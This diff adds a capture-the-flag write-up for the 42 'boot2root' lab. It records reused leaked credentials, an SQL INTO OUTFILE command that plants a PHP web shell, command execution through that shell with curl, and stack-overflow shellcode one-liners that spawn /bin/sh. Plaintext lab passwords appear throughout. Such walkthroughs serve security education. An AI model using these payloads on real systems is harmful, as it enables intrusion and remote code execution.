@@ -1,0 +1,581 @@
+# 42 final boot2root writeup1
+
+# Introduction
+
+For this project, we’ve created a machine in a custom NAT in virtualbox. We also used a Kali machine in the same network to have all the tools we need.
+
+# Machine scan
+
+- As we don’t have the machine IP, we have to scan the network to find its IP
+- We used nmap to scan the network with this command :
+    
+    ```bash
+    nmap -sP 10.2.0.0/16
+    ```
+    
+- We found two IPs where boot2root is second IP right after our Kali machine.
+- Now we have the IP we can scan the listening ports with nmap again with this command
+    
+    ```bash
+    nmap -sV -T4 192.168.2.2
+    ```
+    
+    ![It gives us this result, a list of opened port with the discovered services from nmap default scripts](https://imgur.com/CizAqWZ.png)
+    
+    It gives us this result, a list of opened port with the discovered services from nmap default scripts
+    
+
+# Web discover
+
+- We decided first to look at the web ports, 80 and 443
+- Browsing the 443 gave us the front page of boot2root. Like a showcase web site
+- But there is something different at the HTTP port
+- We started an automatic web discovering with a tool named `dirb` from the Kali distribution.
+- A primitive scan gives us this result :
+    
+    ![As you can see here, we find a forum, a phpmyadmin and a webmail!](https://imgur.com/6A7xJr2.png)
+    
+    As you can see here, we find a forum, a phpmyadmin and a webmail!
+    
+
+# The forum
+
+- At the forum address that we found with the scan, we find a mylittleforum. This is a basic web forum where there is threads and messages.
+- By exploring the forum, we find someone called **[lmezard](https://10.0.2.7/forum/index.php?mode=user&show_user=5)** that posted an sshd log. There is IPs and login names but there is one important thing.
+- At Oct 5 08:45:29, a username was used that looked like a password :
+    
+    ![Untitled](https://imgur.com/iG6yVw8.png)
+    
+    `!q\]Ej?*5K5cy*AJ`
+    
+- This is the password of the lmezard account in the forum.
+- When we are connected to it, we can go to its account and get its email address : [laurie@borntosec.net](mailto:laurie@borntosec.net)
+- If we try those credentials in the webmail, it works!
+- This is the page when we connect to it :
+    
+    ![Untitled](https://imgur.com/LIeRksD.png)
+    
+- We see 2 mails but the DB Access one have credentials in it :
+    
+    ![Untitled](https://imgur.com/In57T5P.png)
+    
+    `root/Fg-'kKXBj87E:aJ$`
+    
+- In the web scan, we discovered a phpmyadmin URL. This is a web client to access to a DB. With those credentials we can connect to it.
+
+# SQL exploitation
+
+- Now we are root in the DB hosted by our target machine, we can execute SQL instructions.
+- With this power, we can achieve two important thing. The first one is that we can read files in the system and get the /etc/passwd with this SQL command :
+    
+    ```sql
+    SELECT LOAD_FILE( '/etc/passwd' ) AS Result
+    ```
+    
+    - The result :
+        
+        ```
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+        bin:x:2:2:bin:/bin:/bin/sh
+        sys:x:3:3:sys:/dev:/bin/sh
+        sync:x:4:65534:sync:/bin:/bin/sync
+        games:x:5:60:games:/usr/games:/bin/sh
+        man:x:6:12:man:/var/cache/man:/bin/sh
+        lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+        mail:x:8:8:mail:/var/mail:/bin/sh
+        news:x:9:9:news:/var/spool/news:/bin/sh
+        uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+        proxy:x:13:13:proxy:/bin:/bin/sh
+        www-data:x:33:33:www-data:/var/www:/bin/sh
+        backup:x:34:34:backup:/var/backups:/bin/sh
+        list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+        irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+        nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+        libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+        syslog:x:101:103::/home/syslog:/bin/false
+        messagebus:x:102:106::/var/run/dbus:/bin/false
+        whoopsie:x:103:107::/nonexistent:/bin/false
+        landscape:x:104:110::/var/lib/landscape:/bin/false
+        sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+        ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
+        mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
+        ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
+        lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
+        laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
+        laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
+        thor:x:1004:1004:,,,:/home/thor:/bin/bash
+        zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
+        dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+        dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
+        postfix:x:110:118::/var/spool/postfix:/bin/false
+        ```
+        
+- The second, and the most important one, is that we can write file. We find a path where it is possible. In `/var/www/forum/templates_c/`, the SQL server has the right to write a file in it. This is useful to know when those files can be executed by PHP-CLI.
+- So with this SQL command, we injected a malicious PHP file that execute a command passed in URL parameters. This is the code :
+    
+    ```sql
+    select '
+    <?php system($_GET["cmd"]) ?>
+    ' INTO OUTFILE '/var/www/forum/templates_c/exploit.php'
+    ```
+    
+
+# Backdoor exploitation
+
+- Now we have a backdoor we can execute the commands we want in the remote machine. Here is a sample :
+
+`curl -k https://10.0.2.7/forum/templates_c/exploit.php?cmd=ls%20/home/zaz`
+
+![Untitled](https://imgur.com/hoQiXPF.png)
+
+- By exploring the machine, we found this file :
+
+![Untitled](https://imgur.com/GLaagcd.png)
+
+- But ssh does not work for those credentials.
+- Do you remember the ports scanning at the beginning?
+
+# Fun Transfer Protocol
+
+- After a test in all services hosted by the machine, the service that accepted our login/password is FTP.
+- Just after connecting, these two files are listed
+    
+    ![Untitled](https://imgur.com/iPY0ZG8.png)
+    
+- Here the content of README :
+    
+    ![Untitled](https://imgur.com/DHSgwT7.png)
+    
+- Fun is a tarball :
+    
+    ![Untitled](https://imgur.com/Cruf0s1.png)
+    
+- The content of the tarball is a directory full of many pcap files
+    
+    ![Untitled](https://imgur.com/0VegvyE.png)
+    
+- But the pcap suffixed file are not really pcap, it’s a big c file spliced into many files.
+- Here is a sample of a file :
+    
+    ![Untitled](https://imgur.com/QgZDhZK.png)
+    
+- So we created a python code to create a file for each file that has for name the last line:
+    
+    ```python
+    import os
+    l
+    directory = '/home/kali/Downloads/ft_fun'
+    
+    for filename in os.listdir(directory):
+        if filename.endswith('.pcap'):
+            with open(os.path.join(directory, filename), "r") as f:
+                content = f.read().strip()
+                last_line = content.split("\n")[-1]
+                with open(last_line.replace("/", ""), "w") as new_file:
+                    new_file.write(content + "\n")
+    ```
+    
+- After that we display each file a concat in a new one with this command:
+    
+    ```python
+    cat file* > fun.c
+    ```
+    
+
+- Compile it a run it to get this result :
+
+![Untitled](https://imgur.com/m2GkJ3p.png)
+
+- The result is :
+    
+    ```python
+    330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+    ```
+    
+
+# The bomb
+
+After the last part, you are now able to log in the machine trough SSH with `laurie` and `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` as password!
+
+![Untitled](https://imgur.com/bSiQK2z.png)
+
+## A bomb?!
+
+There is an executable named `bomb` when we try to execute it explode!
+
+Here is a log:
+
+![Untitled](https://imgur.com/xsbrpoE.png)
+
+So we need to take our reverse engineering tools!
+
+So there is 6 stages…
+
+The bomb executable can read stdin or take a file as the first parameter.
+
+### Stage 1
+
+The first stage is the easiest. It’s a string to find in the executable.
+
+`Public speaking is very easy.`
+
+So just enter this string and we go to the second stage
+
+### Stage 2
+
+This stage ask for a 6 numbers formated as follow : `%d %d %d %d %d %d`
+
+The first number must be one else the bomb explode.
+
+Each next number is the product of the current number and the index of it + 2 as follow :
+
+| Indexex | Index + 2 |  |
+| --- | --- | --- |
+| 0 | 2 | 1 |
+| 1 | 3 | 2 |
+| 2 | 4 | 6 |
+| 3 | 5 | 24 |
+| 4 | 6 | 120 |
+| 5 | 7 | 720 |
+
+Here is the solution file :
+
+```python
+1 2 6 24 120 720
+```
+
+### Stage 3
+
+The expected input is in that form : `%d %c %d`
+
+For the first int, we must choose a number between 0 and 7.
+
+This choice set the expectation of the two left parameter.
+
+![Untitled](https://imgur.com/psFCjrI.png)
+
+As you can see at the decompiled code in that screenshot, if we choose 0 for the first parameter, uVar2 is set to 0x71 and var_8h (the third parameter must be equal to 0x309).
+
+At the end of this stage, the code test if uVar2 is equal to our second parameter :
+
+![Untitled](https://imgur.com/CMFmX6i.png)
+
+If it’s true, the stage return and we can go to the fourth step.
+
+Here is the list of possibilities :
+
+- `0 q 777`
+- `1 b 214`
+- `2 b 755`
+- `3 k 251`
+- `4 o 160`
+- `5 t 458`
+- `6 v 780`
+- `7 b 524`
+
+### Stage 4
+
+In this stage, a part of a previously used string is in parameter of a sscanf that is an int.
+
+After that, the input is gived to a similar implementation of fibonacci with a index shift.
+
+Only a 55 return of this function will not make the bomb explode.
+
+So 55 is the 10th element of fibonacci but here is 9. So we only have to enter the 9 number
+
+### Stage 5
+
+In this stage, you need to provide 6 chars.
+
+```
+void phase_5(int32_t arg_4h)
+{
+    int32_t iVar1;
+    int32_t var_1ch;
+    int32_t var_ch;
+    int32_t var_6h;
+
+    iVar1 = string_length(arg_4h);
+    if (iVar1 != 6) {
+    // WARNING: Subroutine does not return
+        explode_bomb();
+    }
+    iVar1 = 0;
+    do {
+        *(char *)((int32_t)&var_ch + iVar1) = str.isrveawhobpnutfg[(char)(*(uint8_t *)(iVar1 + arg_4h) & 0xf)];
+        iVar1 = iVar1 + 1;
+    } while (iVar1 < 6);
+    var_6h._0_1_ = 0;
+    iVar1 = strings_not_equal((int32_t)&var_ch, (int32_t)"giants");
+    if (iVar1 != 0) {
+    // WARNING: Subroutine does not return
+        explode_bomb();
+    }
+    return;
+}
+```
+
+Each 4 least significant bits of our input correspond to an index of a string(`"isrveawhobpnutfg"`).
+
+The goal is to construct a target string “giants” by using the correct indexes.
+
+So we have to input any chars that have [15, 0, 5, 11, 13, 1] as their 4 least significant bits accordingly to pass this phase.
+
+![Untitled](https://imgur.com/0CQSxQA.png)
+
+### Stage 6
+
+In this stage with can input 6 ints as follow : `%d %d %d %d %d %d`
+
+In the first loop, we saw that we can’t have an int greater than 6 and lower than 0.
+
+We also saw that duplications make the bomb explode.
+
+After more researchs, we deduct that these numbers are index where the bomb will take some data in memory.
+
+This data is asm instructions from the exe.
+
+In the executable there are debug symbol named node1, node2, node3 etc. They got the address of an instruction.
+
+At the beginning of this stage, the address of node1 is stored in the stack.
+
+After the first loop, there is a another loop where the function will put in an array six nodes from the order we input in those ints.
+
+Finally, the program we iterate through this node array and will check if it’s sorted, by instruction bycode value in a descending order.
+
+Here is a reprensentation of that :
+
+![Untitled](https://imgur.com/b6zguK5.png)
+
+![Untitled](https://imgur.com/mmPHgJn.png)
+
+# Thor !
+
+![Untitled](https://imgur.com/HyOEaZd.png)
+
+Our version :
+
+`Publicspeakingisveryeasy.126241207202b7559opekma426315`
+
+Last -1 reversed chars (error in the subject) :
+
+`Publicspeakingisveryeasy.126241207202b7559opekma426135`
+
+Alt (magic hit us and with found the good combinaison) :
+
+`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+
+The last password work to connect to the thor account
+
+```python
+import itertools
+
+pass_prefix = 'Publicspeakingisveryeasy.12624120720'
+stage3 = ["0q777", '1b214', '2b755', '3k251', '4o160', '5t458', '6v780']
+stage4 = '9'
+stage5 = [15, 0, 5, 11, 13, 1]
+stage6 = '426135'
+
+stage3_passes = [pass_prefix + i + stage4 for i in stage3]
+
+possible_stage5 = {i:[] for i in stage5}
+for ii in stage5:
+    for i in range(1, 16):
+        put = ii | i << 4
+        if (put >= 48 and put <= 57) or  (put >= 65 and put <= 90) or (put >= 97 and put <= 122):
+            possible_stage5[ii].append(chr(put))
+sorted_stage5 = [possible_stage5[i] for i in stage5]
+
+stage5_passes = []
+for i in itertools.product(*sorted_stage5):
+    joined = ''.join(i)
+    for a in stage3_passes:
+        stage5_passes.append(a + joined)
+
+final_passes = []
+for i in stage5_passes:
+    final_passes.append(i + stage6)
+
+final_passes.reverse()
+
+with open("passes.txt", "w+") as my_file:
+    for i in final_passes:
+        my_file.write(i+'\n')
+```
+
+# The Turtle
+
+- In the home, we found a README first with this inside :
+
+> Finish this challenge and use the result as password for 'zaz' user.
+> 
+- There is also a file with moving instructions. We deduct that is a french version of a python turtle code. At the end of this file, there is this phrase :
+    
+    > Can you digest the message? :)
+    > 
+- With the script bellow, we was able to execute each instruction as python turtle ones.
+    
+    ```python
+    from turtle import *
+    color('red', 'yellow')
+    
+    moves = {
+        'droite' : right , "gauche" : left,  "Avance" : forward , "Recule" : backward
+    }
+    
+    with open("turtle.txt") as commands:
+        lines = commands.readlines()
+        for line in lines:
+            if len(line) > 5:
+                val = int(''.join(filter(str.isdigit, line)))
+                for move in moves:
+                    if move in line:
+                        moves[move](val)
+    done()
+    ```
+    
+- The turtle code open a window and drawing this :
+
+![Untitled](https://imgur.com/D3wLuOO.png)
+
+- It reads “SLASH” (each letter is drawn at 90° from the previous one)
+- After reading `Can you digest the message? :)` one hundred times, we understood that we need to digest it, in other words **hash** the result and use it as password
+- As we didn’t know which hash algorithm we needed, we’ve written a script for that :
+    
+    ```python
+    import hashlib
+    
+    slashes = ["SLASH", "slash", "/"]
+    for alg in hashlib.__dict__['algorithms_available']:
+        if alg in hashlib.__dict__:
+            for s in slashes:
+                m = hashlib.__dict__[alg]()
+                digest = None
+                m.update(s.encode('utf-8'))
+                if "shake" in alg:
+                    print(m.hexdigest(256))
+                else:
+                    print(m.hexdigest())
+    ```
+    
+- It generated all hashes from popular algorithms
+- After a run of hydra, we found a correct password !
+    
+    ![Untitled](https://imgur.com/tPJFBfp.png)
+    
+    `646da671ca01bb5d84dbb5fb2238dc8e`
+    
+
+# ZAZ to Root
+
+![Untitled](https://imgur.com/ea4kUZG.png)
+
+> It seems like there are many ways to be root here
+> 
+
+`646da671ca01bb5d84dbb5fb2238dc8e`
+
+# Buffer Overflow
+
+- Here is the decompiled (ghidra) code of exploit_me :
+    
+    ```c
+    int32_t main (char ** argv, char ** envp) {
+        const char * src;
+        char * dest;
+        if (argv <= 1) {
+            eax = 1;
+        } else {
+            eax = envp;
+            eax += 4;
+            eax = *(eax);
+            eax = &dest;
+            strcpy (eax, *(eax));
+            eax = &dest;
+            puts (eax);
+            eax = 0;
+        }
+        return eax;
+    }
+    ```
+    
+- Here is the ASM code :
+    
+    ```nasm
+    int main (int argc, char **argv, char **envp);
+    ; var const char *src @ stack - 0x90
+    ; var char *dest @ stack - 0x84
+    ; arg char **argv @ stack + 0x4
+    ; arg char **envp @ stack + 0x8
+    0x080483f4      push    ebp
+    0x080483f5      mov     ebp, esp
+    0x080483f7      and     esp, 0xfffffff0
+    0x080483fa      sub     esp, 0x90
+    0x08048400      cmp     dword [argv], 1
+    0x08048404      jg      0x804840d
+    0x08048406      mov     eax, 1
+    0x0804840b      jmp     0x8048436
+    0x0804840d      mov     eax, dword [envp]
+    0x08048410      add     eax, 4
+    0x08048413      mov     eax, dword [eax]
+    0x08048415      mov     dword [src], eax ; const char *src
+    0x08048419      lea     eax, [dest]
+    0x0804841d      mov     dword [esp], eax ; char *dest
+    0x08048420      call    strcpy     ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
+    0x08048425      lea     eax, [dest]
+    0x08048429      mov     dword [esp], eax ; const char *s
+    0x0804842c      call    puts       ; sym.imp.puts ; int puts(const char *s)
+    0x08048431      mov     eax, 0
+    0x08048436      leave
+    ```
+    
+
+What’s triggered us a stackoverflow idea is that we have a call of strcpy. So we can copy as many chars we want in the stack!
+
+What we want to know first is the size of the destination. As you can see in the comment, the dest pointer is at main -0x84. 0x84 in dec is 132 but this is not the total length. At 0x080483f4 you can see that there is a backup of ebp that is 4 bytes. So our dest size is 132+4 = 136 bytes.
+
+Additionnally, there is a memory alignment of 4 bytes at 0x080483f7 so in any case, the length with char before EIP save is 140 bytes.
+
+EIP saves the address where the program will go after the end of the current function. We will overwrite that and redirect the program execution flow. 
+
+In theses bytes we will have a shell code to execute what we want. For the first test, it will be an execve of /bin/sh.
+
+Here is the shellcode : 
+
+[Linux/x86-64 - Execute /bin/sh - 27 bytes](https://shell-storm.org/shellcode/files/shellcode-806.html)
+
+```nasm
+./exploit_me `perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x60\xf6\xff\xbf"'`
+```
+
+ltrace helps us to find the target address
+
+[https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)
+
+[https://www.calculator.net/hex-calculator.html](https://www.calculator.net/hex-calculator.html)
+
+## Solutions
+
+### Ret2libc
+
+[Retour à la libc](https://beta.hackndo.com/retour-a-la-libc/)
+
+### Autonomous shellcode
+
+```nasm
+./exploit_me `perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x60\xf6\xff\xbf"'`
+```
+
+### In prev frame shellcode
+
+```nasm
+./exploit_me `python -c "print('1'*140 + '\xc6\xf6\xff\xbf' + '2'*20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"`
+```
+
+### In curr frame light shellcode
+
+```nasm
+./exploit_me $(perl -e 'print "\x90"x39 . "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" . "\x90"x80 . "\x60\xf6\xff\xbf"')
+```
